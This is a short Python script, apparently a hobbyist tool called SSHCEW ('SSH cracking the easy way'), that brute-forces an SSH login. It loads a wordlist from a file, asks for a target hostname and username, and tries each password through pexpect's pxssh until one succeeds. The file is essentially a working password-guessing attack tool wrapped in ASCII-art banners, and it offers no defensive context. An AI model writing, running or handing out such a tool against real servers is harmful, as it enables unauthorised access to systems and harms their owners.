#print("MMMMMMMMMMMMMMNOoloddoloOWMMMMMMMMMMMMMM")
#print("MMMMMMMMMMMMNkllkNMMMMNkllONMMMMMMMMMMMM")
#print("MMMMMMMMMMWkloOWMMMMMMMMWOx0NWMMMMMMMMMM")
#print("MMMMMMMMMXocOWMMMMMMMMMMMMMNddXMMMMMMMMM")
#print("MMMMMMMMXllKX0kxddddddddxk0NKllXMMMMMMMM")
#print("MMMMMMMWo'cc:oxkO0KKKK0Okxo:cc'oWMMMMMMM")
#print("MMMMMMMK;;xccXMMMMMMMMMMMM0:ld,;KMMMMMMM")
#print("MMMMMMMO:kMXOXMMMMMMMMMMMMx:OMk:OMMMMMMM")
#print("MMMMMMMO:xMKlxWMMMMMMMMMMWocXMx:0MMMMMMM")
#print("MMMMMMMXclNWoc0MMMMMMMMMMO:xWNllNMMMMMMM")
#print("MMMMMMMMO:xWXocOWMMMMMMNkcdNWx:OMMMMMMMM")
#print("MMMMMMMNk;,xNNOolxOOOkdlo0WNd,;kNMMMMMMM")
#print("MMMMMNxlokklOWMWKkxddxkKWMWOlkkolxNMMMMM")
#print("MMMWOll0WMWNXWWWWWWWWWWWWMWNNWMW0olOWMMM")
#print("MMWx:xNWOoddddddddddddddkXXkddd0WNx:xWMM")
#print("MWk:kWMO:dNNNNNNNNNNNNNNNWWNNXo:KMWk:kWM")
#print("MXclNMMk:OMMMMMMMWNNNWMMMMMMMMx:0MMNlcXM")
#print("MO:kMMMk:OMMMMMNkoddddoOWMMMMMx:0MMMk:OM")
#print("Mk:OMMMk:OMMMMNo:ONWWNk:xWMMMMx:0MMMO:kM")
#print("MOcOMMMOcOMMMMXldWMMMMNllNMMMMkc0MMMOcOM")
import os
import sys
from pexpect import pxssh
import getpass

def parseList(pass_list):
    with open(sys.argv[1],'r') as file:
        for line in file:
            for word in line.split():
                pass_list.append(word)
                
   
def tryPass(i, password_list):

    #password = input('password: ')
    try:
        session = pxssh.pxssh()
        session.login(hostname, username, password_list[i])
        
        #session.sendline('ls')
        #session.prompt()
        #print(session.before)
        
        session.logout()
        print(password_list[i] + " Worked");
        sys.exit(1)
    except pxssh.ExceptionPxssh:
            print(password_list[i] + " failed")
            session.close()

os.system('clear')

print(" (    (        )                                                                                      ")
print(" )\ ) )\ )  ( /(                          )                                                           ")
print("(()/((()/(  )\())      (       )       ( /( (          (  (      (     )      (      (  (       )  (  ")
print(" /(_))/(_))((_)\    (  )(   ( /(   (   )\()))\   (     )\))(    ))\ ( /(  (   )\ )   )\))(   ( /(  )\ )")
print("(_)) (_))   _((_)   )\(()\  )(_))  )\ ((_)\((_)  )\ ) ((_))\   /((_))(_)) )\ (()/(  ((_)()\  )(_))(()/(")
print("/ __|/ __| | || |  ((_)((_)((_)_  ((_)| |(_)(_) _(_/(  (()(_) (_)) ((_)_ ((_) )(_)) _(()((_)((_)_  )(_))")
print("\__\ \__ \ | __ | / _|| '_|/ _` |/ _| | / / | || ' \))/ _` |  / -_)/ _` |(_-<| || | \ V  V // _` || || |")
print("|___/|___/ |_||_| \__||_|  \__,_|\__| |_\_\ |_||_||_| \__, |  \___|\__,_|/__/ \_, |  \_/\_/ \__,_| \_, |")
print("                                                      |___/                   |__/                 |__/")


print("Welcome to SSHCEW")
print("You can simply test a few password from a list of common password")
print("and find a ssh password\n")

i = 0

password_list = []
parseList(password_list)
if len(password_list) < 50:
    print(password_list)
list_length = len(password_list)

hostname = input('hostname: ')
username = input('username: ')

while i < list_length:
    tryPass(i,password_list)
    i += 1;
